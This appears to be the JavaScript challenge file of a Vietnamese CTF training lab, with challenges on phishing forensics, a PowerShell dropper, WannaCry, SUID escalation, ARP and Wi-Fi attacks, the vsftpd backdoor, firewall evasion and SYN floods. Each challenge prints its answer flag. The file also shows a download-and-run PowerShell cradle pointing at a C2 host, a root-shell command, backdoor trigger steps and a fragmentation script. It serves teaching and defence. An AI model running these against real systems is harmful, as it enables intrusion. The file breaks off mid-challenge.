/**
 * CTF (Capture The Flag / Packet) Challenge Engine
 * Comprehensive Hands-on Cybersecurity & Network Protocols Labs
 * Covering all 7 IT Infrastructure Domains + Core Networking CCNA
 */
class CTFEngine {
    constructor() {
        this.challenges = [
            // =========================================================================
            // DOMAIN 1: VÙNG NGƯỜI DÙNG (USER DOMAIN)
            // =========================================================================
            {
                id: 1,
                domain: "user",
                domainVi: "1. Vùng Người Dùng (User Domain)",
                title: "Thử Thách 1: Phishing Email Header & Điều Tra Giả Mạo SPF/DKIM",
                category: "Kỹ Nghệ Xã Hội (Social Engineering / Phishing)",
                difficulty: "Dễ",
                points: 100,
                description: "Một email khẩn cấp gửi tới Trưởng phòng Tài chính giả mạo CEO yêu cầu duyệt chi tiền gấp vào tài khoản lạ. Đội ngũ SOC đã trích xuất toàn bộ tiêu đề thư RFC 5322 (Email Header). Hãy phân tích các trường Authentication-Results, Received, và liên kết độc hại để xác định kết quả kiểm tra SPF, địa chỉ IP máy chủ gửi và tên miền C2!",
                codeSnippet: `Delivered-To: cfo@finance-corp.vn
Received: by 2002:a05:6512:444:: with SMTP id t4csp12456;
        Mon, 17 Nov 2026 09:14:22 -0800 (PST)
Received: from mail.evil-c2-phish.xyz (mail.evil-c2-phish.xyz. [185.220.101.45])
        by mx.google.com with ESMTP id w12si89012qkj.45
        for <cfo@finance-corp.vn>;
Received-SPF: fail (google.com: domain of attacker@evil-c2-phish.xyz does not designate 185.220.101.45 as permitted sender) client-ip=185.220.101.45;
Authentication-Results: mx.google.com;
       dkim=fail header.i=@finance-corp.vn;
       spf=fail (google.com: domain of attacker@evil-c2-phish.xyz does not designate 185.220.101.45 as permitted sender) smtp.mailfrom=attacker@evil-c2-phish.xyz;
       dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=finance-corp.vn
From: "CEO Nguyen Van An" <ceo@finance-corp.vn>
Reply-To: "Executive Desk" <exec-approval@evil-c2-phish.xyz>
To: cfo@finance-corp.vn
Subject: [KHẨN CẤP] Ủy nhiệm chi thanh toán hợp đồng bảo mật Q4-2026
Date: Mon, 17 Nov 2026 17:14:15 +0700
Message-ID: <20261117171415.8921.qmail@evil-c2-phish.xyz>
Content-Type: text/html; charset="UTF-8"

<p>Chào anh, vui lòng duyệt thanh toán gấp theo chứng từ đính kèm tại liên kết bảo mật:</p>
<a href="https://evil-c2-phish.xyz/invoice/view?token=8f9a2b">Xem UNC & Duyệt Thanh Toán Ngay</a>

Nhiệm vụ: Tìm kết quả SPF (spf_fail), IP relay của kẻ tấn công và tên miền C2 lừa đảo.
Định dạng nộp cờ: FLAG{spf_fail_<IP_Attacker>_<C2_Domain>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>MXToolbox Email Header Analyzer</b> / <b>Google Admin Toolbox (Messageheader)</b>: Phân tích trực quan từng chặng chuyển tiếp thư.<br>
            • <b>CyberChef</b> / <b>VS Code</b> / Lệnh Linux <code>grep -i -E "spf|received|reply-to"</code>: Trích xuất nhanh các trường dữ liệu quan trọng.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Xem dòng <code>Authentication-Results</code>: SPF trả về kết quả <b>spf=fail</b> do IP gửi không nằm trong bản ghi SPF TXT của domain finance-corp.vn.<br>
            2. Chặng mạng <code>Received: from mail.evil-c2-phish.xyz</code> xác định IP máy chủ relay của kẻ tấn công là <b>185.220.101.45</b>.<br>
            3. Trường <code>Reply-To</code> và thẻ <code>&lt;a href="..."&gt;</code> trỏ trực tiếp về tên miền C2 độc hại: <b>evil-c2-phish.xyz</b>.<br>
            4. Ghép lại theo định dạng cờ: <code>FLAG{spf_fail_185.220.101.45_evil-c2-phish.xyz}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{spf_fail_185.220.101.45_evil-c2-phish.xyz}"
            },
            {
                id: 2,
                domain: "user",
                domainVi: "1. Vùng Người Dùng (User Domain)",
                title: "Thử Thách 2: Bẫy Vật Lý USB Baiting & Giải Mã PowerShell Dropper",
                category: "Bẫy Vật Lý (Baiting / USB Drop)",
                difficulty: "Trung bình",
                points: 150,
                description: "Nhân viên nhặt được chiếc USB có dán nhãn 'Danh_Sach_Thuong_Tet_2026.pdf.lnk' tại sảnh công ty và cắm vào máy tính. File shortcut kích hoạt tiến trình ngầm powershell.exe với tham số -Enc (EncodedCommand) để tải mã độc vào bộ nhớ. Hãy giải mã payload Base64 UTF-16LE để bóc trần hàm tải file, địa chỉ IP C2 và cổng lắng nghe!",
                codeSnippet: `# Trích xuất đối số dòng lệnh từ Shortcut LNK qua sự kiện Sysmon Event ID 1:
C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMgAwAC4AMQA1ADUAOgA4ADQANAAzAC8AcABheWxvYWQucHMxACcAKQA=

# Nhiệm vụ: Giải mã tham số Base64 UTF-16LE sang chuỗi lệnh PowerShell nguyên gốc.
# Định dạng nộp cờ: FLAG{powershell_<hàm_tải_file>_<IP_C2>_<Port>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>CyberChef</b>: Thêm Recipe <code>From Base64</code> -> <code>Decode text (UTF-16LE (1200))</code>.<br>
            • <b>Terminal Linux/macOS</b>: <code>echo "SQBF..." | base64 -d | iconv -f UTF-16LE -t UTF-8</code>.<br>
            • <b>NETLAB CLI</b>: Bạn có thể gõ ngay <code>b64 decode &lt;chuỗi&gt;</code> trong Terminal bên dưới!
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. PowerShell trên Windows luôn lưu trữ chuỗi mã hóa sau <code>-Enc</code> dưới định dạng 2-byte Unicode UTF-16 Little Endian.<br>
            2. Kết quả sau khi giải mã: <code>IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.155:8443/payload.ps1')</code>.<br>
            3. Hàm thực thi tải tệp trực tiếp vào RAM là <b>DownloadString</b>, địa chỉ IP C2 là <b>10.10.20.155</b> và cổng là <b>8443</b>.<br>
            4. Cờ hoàn chỉnh: <code>FLAG{powershell_DownloadString_10.10.20.155_8443}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{powershell_DownloadString_10.10.20.155_8443}"
            },

            // =========================================================================
            // DOMAIN 2: VÙNG MÁY TRẠM (WORKSTATION DOMAIN)
            // =========================================================================
            {
                id: 3,
                domain: "workstation",
                domainVi: "2. Vùng Máy Trạm (Workstation Domain)",
                title: "Thử Thách 3: Điều Tra Ransomware & Truy Tìm Kill-Switch Domain",
                category: "Mã Độc Máy Trạm (Ransomware Forensics)",
                difficulty: "Trung bình",
                points: 150,
                description: "Trạm làm việc của kế toán viên bị tấn công bởi mã độc tống tiền họ WannaCry từ tiến trình tasksche.exe, toàn bộ dữ liệu bị đổi đuôi sang .wncry. Trước khi mã hóa ổ cứng, mã độc luôn gửi request HTTP GET tới một domain sinkhole (Kill-Switch). Phân tích chuỗi nhị phân (strings dump) của tiến trình để tìm domain giải cứu này!",
                codeSnippet: `$ strings -a -t x tasksche_memory_dump.dmp | grep -i "http://"
  40e010  http://www.w3.org/1999/xhtml
  40e080  http://schemas.microsoft.com/expression/2006
  40f1a0  http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
  40f230  InternetOpenA; wininet.dll
  40f260  InternetOpenUrlA: GET http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
  40f2d0  CryptGenRandom; CryptEncrypt; CryptExportKey; advapi32.dll
  40f340  cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet

[THÔNG TIN ĐIỀU TRA]:
Nếu truy vấn HTTP tới domain sinkhole trả về Status 200 OK, mã độc sẽ kích hoạt Kill-Switch và thoát tiến trình lập tức!
Định dạng nộp cờ: FLAG{killswitch_<tên_miền_hoàn_chỉnh>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Volatility Framework</b>: <code>vol.py -f memory.raw windows.strings / windows.netscan</code>.<br>
            • <b>Sysinternals Strings / Linux CLI</b>: <code>strings tasksche.exe | grep -i "http"</code>.<br>
            • <b>Ghidra / IDA Pro</b>: Decompile hàm WinMain và kiểm tra hàm <code>InternetOpenUrlA</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Mã độc WannaCry kiểm tra xem domain sinkhole có phản hồi không trước khi mã hóa; nếu domain phản hồi thành công, mã độc tự thoát nhằm tránh bị phân tích trong môi trường Sandbox ảo hóa.<br>
            2. Tên miền Kill-Switch nằm tại offset <code>40f1a0</code>: <b>www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</b>.<br>
            3. Cờ hợp lệ: <code>FLAG{killswitch_www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{killswitch_www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}"
            },
            {
                id: 4,
                domain: "workstation",
                domainVi: "2. Vùng Máy Trạm (Workstation Domain)",
                title: "Thử Thách 4: Leo Thang Đặc Quyền Linux Qua SUID Bit (GTFOBins)",
                category: "Leo Thang Đặc Quyền (Local Privilege Escalation)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Kẻ tấn công chiếm được tài khoản thường devops (uid=1001) trên máy trạm lập trình viên. Rà quét phân quyền phát hiện một binary hệ thống được bật cờ SUID (-rwsr-xr-x) thuộc quyền root. Hãy xác định cú pháp GTFOBins chuẩn với binary /usr/bin/find để spawn một root shell và chiếm quyền quản trị cao nhất!",
                codeSnippet: `devops@workstation-ubuntu:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops),4(adm)

devops@workstation-ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/find   <--- [CẢNH BÁO: SUID BIT SET BỞI QUẢN TRỊ VIÊN CẨU THẢ]
/usr/bin/gpasswd

devops@workstation-ubuntu:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 198944 Jan 15 2026 /usr/bin/find

Nhiệm vụ: Tìm tham số của lệnh /usr/bin/find để thực thi shell /bin/sh giữ nguyên quyền root (-p).
Định dạng nộp cờ: FLAG{find_-exec_/bin/sh_-p_\\;_-quit}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>LinPEAS</b>: Script tự động dò lỗ hổng leo thang đặc quyền Linux.<br>
            • <b>GTFOBins</b>: Tra cứu kỹ thuật bypass shell tại <code>gtfobins.github.io/gtfobins/find</code>.<br>
            • Lệnh tìm SUID: <code>find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Khi binary có quyền SUID (Set User ID), bất kỳ ai chạy nó đều sở hữu quyền của file owner (ở đây là root).<br>
            2. Tiện ích <code>find</code> hỗ trợ cờ <code>-exec</code> để chạy lệnh ngoại trú.<br>
            3. Trên Linux hiện đại, <code>/bin/sh</code> sẽ tự động hạ EUID về UID thực tế nếu không có tham số <code>-p</code> (preserve privileges). Cú pháp chuẩn: <code>find . -exec /bin/sh -p \\; -quit</code>.<br>
            4. Cờ nộp: <code>FLAG{find_-exec_/bin/sh_-p_\\;_-quit}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{find_-exec_/bin/sh_-p_\\;_-quit}"
            },

            // =========================================================================
            // DOMAIN 3: VÙNG MẠNG LAN (LAN DOMAIN)
            // =========================================================================
            {
                id: 5,
                domain: "lan",
                domainVi: "3. Vùng Mạng LAN (LAN Domain)",
                title: "Thử Thách 5: Bắt Gói Tin ARP Poisoning & Đánh Chặn NetNTLMv2",
                category: "Tấn Công Trung Gian (MITM / ARP Spoofing)",
                difficulty: "Trung bình",
                points: 150,
                description: "Kẻ tấn công cắm laptop vào ổ cắm mạng LAN phòng họp và gửi các gói tin Gratuitous ARP giả mạo để chiếm vị trí trung gian giữa máy kế toán 192.168.1.50 và Gateway 192.168.1.1. Phân tích file pcap để xác định địa chỉ MAC của kẻ tấn công và giá trị Username bị nghe lén trong phiên xác thực SMB/NTLMSSP!",
                codeSnippet: `=== Wireshark Packet Dissection (lan_mitm.pcap) ===
Frame 102: 42 bytes on wire (ARP Announcement)
    Address Resolution Protocol (reply)
        Sender MAC address: 00:0c:29:ab:cd:ef  <-- [!] Gratuitous ARP
        Sender IP address:  192.168.1.1 (Gateway IP)
        Target MAC address: 00:1a:2b:3c:4d:5e (Victim PC)
        Target IP address:  192.168.1.50
    [Expert Info: Duplicate IP address detected for 192.168.1.1 (real gateway is 00:50:56:c0:00:01)]

Frame 128: 198 bytes on wire (SMB2 / NTLMSSP Negotiate & Auth)
    Transmission Control Protocol, Src Port: 51234, Dst Port: 445 (SMB)
    SMB2 (Server Message Block Protocol Version 2)
    SMB2 Header: Command: Session Setup (0x0001)
    Security Blob: GSS-API / NTLMSSP
        NTLMSSP: NTLMSSP_AUTH
        Calling workstation domain: CORP-VN
        User name: finance_lead
        NTLM Response: d8a94b210f... (NetNTLMv2 Captured by Responder)

Định dạng cờ: FLAG{arp_spoof_mac_<MAC_Attacker>_user_<Username>}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Wireshark Filter</b>: <code>arp.duplicate-address-detected || ntlmssp.auth.username</code>.<br>
            • <b>Responder / Ettercap / Bettercap</b>: Công cụ thực hiện MITM và bẫy NTLM hash trong LAN.<br>
            • <b>Tshark CLI</b>: <code>tshark -r lan_mitm.pcap -Y "smb2" -T fields -e ntlmssp.auth.username</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Trong Frame 102, địa chỉ IP Gateway <code>192.168.1.1</code> bị gán cho MAC giả mạo <b>00:0c:29:ab:cd:ef</b> thay vì MAC thật của Router <code>00:50:56:c0:00:01</code>.<br>
            2. Trong Frame 128 (phiên SMB2 port 445), trường NTLMSSP_AUTH chỉ rõ tên người dùng bị đánh cắp NetNTLMv2 hash là <b>finance_lead</b>.<br>
            3. Ghép nối thành cờ: <code>FLAG{arp_spoof_mac_00:0c:29:ab:cd:ef_user_finance_lead}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{arp_spoof_mac_00:0c:29:ab:cd:ef_user_finance_lead}"
            },
            {
                id: 6,
                domain: "lan",
                domainVi: "3. Vùng Mạng LAN (LAN Domain)",
                title: "Thử Thách 6: Vạch Trần Wi-Fi Giả Mạo Evil Twin & Rogue AP",
                category: "Tấn Công WLAN (Evil Twin / Rogue AP)",
                difficulty: "Trung bình",
                points: 150,
                description: "Kẻ tấn công dựng trạm phát sóng Wi-Fi giả mạo (Evil Twin) phát cùng SSID 'CORPORATE_SECURE_WLAN' với công suất phát rất cao nhằm dụ các máy laptop công ty tự động nhảy kết nối (roaming) để bắt trọn lưu lượng web. Hãy phân tích bảng quét tần số từ airodump-ng để tìm ra BSSID của Rogue AP và kênh (Channel) hoạt động!",
                codeSnippet: `$ airodump-ng wlan0mon --essid CORPORATE_SECURE_WLAN

BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
-----------------  ---  -------  -----  --  ---  ---  ------  ----  ---------------------
24:A4:3C:88:12:00  -68      420    950   1  54e  WPA2 CCMP    8021X CORPORATE_SECURE_WLAN [Official AP-Cisco]
F8:E9:03:DD:AA:99  -21     1580   4100   6  54e  OPEN         NONE  CORPORATE_SECURE_WLAN [Rogue Evil Twin AP]
24:A4:3C:88:12:01  -72      390    610  11  54e  WPA2 CCMP    8021X CORPORATE_SECURE_WLAN [Official AP-Cisco]

[CẢNH BÁO AN NINH]:
Rogue AP phát sóng với công suất cực mạnh (PWR -21 dBm) lấn át AP chính quy, nhưng hạ cấp mã hóa xuống OPEN (Không mật khẩu).
Định dạng nộp cờ: FLAG{evil_twin_bssid_<BSSID>_ch<Channel>} (BSSID viết hoa đầy đủ)`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Aircrack-ng suite</b>: <code>airodump-ng</code>, <code>airmon-ng</code>, <code>aireplay-ng</code>.<br>
            • <b>Kismet / Wireshark 802.11</b>: Phân tích khung truyền Beacon và Probe Response.<br>
            • <b>Wi-Fi Analyzer / inSSIDer</b>: Giám sát cường độ tín hiệu RSSI và phát hiện AP lậu.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Evil Twin AP thường được đặt gần khu vực người dùng nên có mức thu tín hiệu PWR rất mạnh: <b>-21 dBm</b> (chỉ số âm càng nhỏ thì tín hiệu càng mạnh).<br>
            2. AP chính quy sử dụng WPA2-Enterprise (802.1X), trong khi AP giả mạo mở <b>OPEN / NONE</b> để bẫy Captive Portal lừa mật khẩu.<br>
            3. BSSID của Rogue AP là <b>F8:E9:03:DD:AA:99</b> và hoạt động trên kênh <b>6</b>.<br>
            4. Cờ: <code>FLAG{evil_twin_bssid_F8:E9:03:DD:AA:99_ch6}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{evil_twin_bssid_F8:E9:03:DD:AA:99_ch6}"
            },

            // =========================================================================
            // DOMAIN 4: VÙNG LAN-TO-WAN (LAN-TO-WAN DOMAIN)
            // =========================================================================
            {
                id: 7,
                domain: "lan-to-wan",
                domainVi: "4. Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                title: "Thử Thách 7: Rà Quét Nmap Thiết Bị Biên & Backdoor vsftpd 2.3.4",
                category: "Trinh Sát & Rà Quét (Port Scan / Vulnerability)",
                difficulty: "Trung bình",
                points: 150,
                description: "Kiểm thử viên quét trinh sát thiết bị biên (Edge Firewall / DMZ Gateway) bằng Nmap. Kết quả phát hiện cổng FTP chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng trong lịch sử an ninh mạng (CVE-2011-2523). Hãy xác định chuỗi ký tự kích hoạt backdoor và số hiệu cổng TCP root shell mở ra!",
                codeSnippet: `$ nmap -sV -p 21,80,443 -Pn 203.0.113.88
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for gateway-dmz.techcorp.vn (203.0.113.88)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
| ftp-vsftpd-backdoor:
|   VULNERABLE: vsftpd version 2.3.4 backdoor
|   State: VULNERABLE (Exploitable)
|   IDs:  CVE:CVE-2011-2523  BID:48539
|   Description:
|     When a username ending with ":)" is sent, vsftpd responds by opening a root shell on port 6200.
80/tcp  open  http    nginx 1.18.0
443/tcp open  ssl/http nginx 1.18.0

Định dạng nộp cờ: FLAG{vsftpd_backdoor_trigger_:)}_port_6200}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Nmap NSE Script</b>: <code>nmap --script ftp-vsftpd-backdoor -p 21 &lt;target&gt;</code>.<br>
            • <b>Metasploit Framework</b>: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>.<br>
            • <b>Netcat</b>: <code>nc 203.0.113.88 21</code> -> Gửi <code>USER test:)</code> và <code>PASS pass</code> -> Kết nối <code>nc 203.0.113.88 6200</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Tháng 7/2011, mã nguồn vsftpd 2.3.4 trên server lưu trữ chính thức bị hacker chèn mã độc ngầm.<br>
            2. Mã độc kiểm tra chuỗi username; nếu kết thúc bằng mặt cười <b>:)</b>, daemon sẽ mở một socket lắng nghe trên cổng TCP <b>6200</b> trao quyền root.<br>
            3. Cờ hoàn chỉnh: <code>FLAG{vsftpd_backdoor_trigger_:)}_port_6200}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{vsftpd_backdoor_trigger_:)}_port_6200}"
            },
            {
                id: 8,
                domain: "lan-to-wan",
                domainVi: "4. Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                title: "Thử Thách 8: Phân Mảnh Gói Tin IP (Fragmentation) Vượt Tường Lửa",
                category: "Vượt Tường Lửa (Firewall Evasion / IP Fragmentation)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Tường lửa Stateless ACL ở biên chặn các gói tin TCP SYN đến cổng bảo mật nội bộ 31337. Pentester sử dụng Scapy để chia nhỏ gói tin thành 2 phân mảnh IP (MTU = 8 bytes), khiến trường cổng đích L4 bị đẩy sang phân mảnh thứ 2. Tường lửa stateless không thể ráp gói tin và để lọt cả 2 fragment vào máy đích. Hãy phân tích đoạn mã Scapy và xác định giá trị trường cờ MF và Fragment Offset!",
                codeSnippet: `from scapy.all import *

target_ip = "198.51.100.25"
secret_port = 31337

# Gói tin TCP SYN nguyên gốc có kích thước header 20 bytes IP + 20 bytes TCP
# Pentester phân mảnh gói tin với kích thước 8 bytes (bội số của 8):
# Fragment 1: Chứa 8 bytes đầu của TCP Header (Source Port, Dst Port một phần)
frag1 = IP(dst=target_ip, id=1337, flags="MF", frag=0) / TCP(sport=49152, dport=secret_port, flags="S")[:8]

# Fragment 2: Chứa 12 bytes còn lại của TCP Header (Flags, Window, Checksum)
# Flags = 0 (Last fragment), Offset = 8 bytes / 8 = 1
frag2 = IP(dst=target_ip, id=1337, flags=0, frag=1) / bytes(TCP(sport=49152, dport=secret_port, flags="S"))[8:]

send([frag1, frag2])
# [FIREWALL LOG]:
# PACKET PASS: IPID=1337, Frag 0, Protocol=TCP, Port filter: UNKNOWN L4 (Passed)
# PACKET PASS: IPID=1337, Frag 1, Protocol=TCP, Non-zero offset (Passed without L4 inspection)

Định dạng nộp cờ: FLAG{scapy_frag_offset_1_port_31337}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Scapy (Python)</b>: Thư viện tạo và điều khiển gói tin tùy ý.<br>
            • <b>Nmap Evasion</b>: <code>nmap -f &lt;target&gt;</code> (phân mảnh 8 bytes) hoặc <code>--mtu 16</code>.<br>
            • <b>Wireshark Filter</b>: <code>ip.flags.mf == 1 || ip.frag_offset &gt; 0</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Tường lửa Stateless (không lưu trạng thái phiên) chỉ kiểm tra số hiệu cổng L4 ở phân mảnh đầu tiên (offset = 0).<br>
            2. Bằng cách đẩy cổng đích sang phân mảnh thứ 2 (Fragment Offset = 1 tương đương vị trí byte số 8), mảnh 0 bị khuyết cổng và mảnh 1 được cho qua vì không phải gói mở đầu.<br>
            3. Giá trị Fragment Offset là <b>1</b> và cổng đích được bảo vệ là <b>31337</b>.<br>
            4. Cờ: <code>FLAG{scapy_frag_offset_1_port_31337}</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{scapy_frag_offset_1_port_31337}"
            },

            // =========================================================================
            // DOMAIN 5: VÙNG MẠNG WAN (WAN DOMAIN)
            // =========================================================================
            {
                id: 9,
                domain: "wan",
                domainVi: "5. Vùng Mạng WAN (WAN Domain)",
                title: "Thử Thách 9: Điều Tra Tấn Công SYN Flood DDoS & Kích Hoạt SYN Cookies",
                category: "Từ Chối Dịch Vụ (DoS / DDoS / SYN Flood)",
                difficulty: "Trung bình",
                points: 150,
                description: "Hệ thống Cổng thông tin tài chính bị hàng vạn IP ma từ Internet liên tục gửi các gói tin TCP SYN mà không gửi phản hồi ACK cuối cùng. Hàng đợi kết nối bán mở (SYN Backlog Queue) bị đầy nghẽn khiến người dùng hợp lệ bị từ chối phục vụ (DDoS). Quản trị viên cần kích hoạt cơ chế phòng vệ nào trong nhân Linux Kernel qua sysctl để chống lại đòn tấn công này?",
                codeSnippet: `$ netstat -nat | grep SYN_RECV | wc -l
65420  # [CẢNH BÁO]: Hàng chục ngàn kết nối kẹt ở trạng thái bán mở SYN_RECV!

$ dmesg | tail -n 6
[ 3210.109] TCP: request_sock_TCP: Possible SYN flooding on port 443. Dropping request.
[ 3210.115] TCP: Possible SYN flooding on port 80. Dropping request.
[ 3210.120] TCP: To mitigate, consider enabling TCP SYN Cookies in sysctl!

$ sysctl net.ipv4.tcp_syncookies
net.ipv4.tcp_syncookies = 0

Nhiệm vụ: Tìm lệnh sysctl chính xác để bật vĩnh viễn tính năng SYN Cookies bảo vệ hệ thống.
Định dạng nộp cờ: FLAG{sysctl_net.ipv4.tcp_syncookies=1}`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>netstat / ss</b>: <code>ss -tan state syn-recv | wc -l</code> để đo mức độ nghẽn.<br>
            • <b>tcpdump</b>: <code>tcpdump -nn -c 100 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'</code>.<br>
            • <b>Linux sysctl</b>: Cấu hình tham số kernel mạng tại <code>/etc/sysctl.conf</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Tấn công SYN Flood làm cạn kiệt tài nguyên bộ nhớ lưu trạng thái kết nối bán mở trong SYN Backlog.<br>
            2. Cơ chế TCP SYN Cookies không lưu trạng thái vào RAM mà mã hóa thông tin kết nối trực tiếp vào số Sequence Number ban đầu của gói tin SYN-ACK phản hồi.<br>
            3. Lệnh kích hoạt tính năng này trong kernel Linux: <code>sysctl net.ipv4.tcp_syncookies=1</code>.<br>
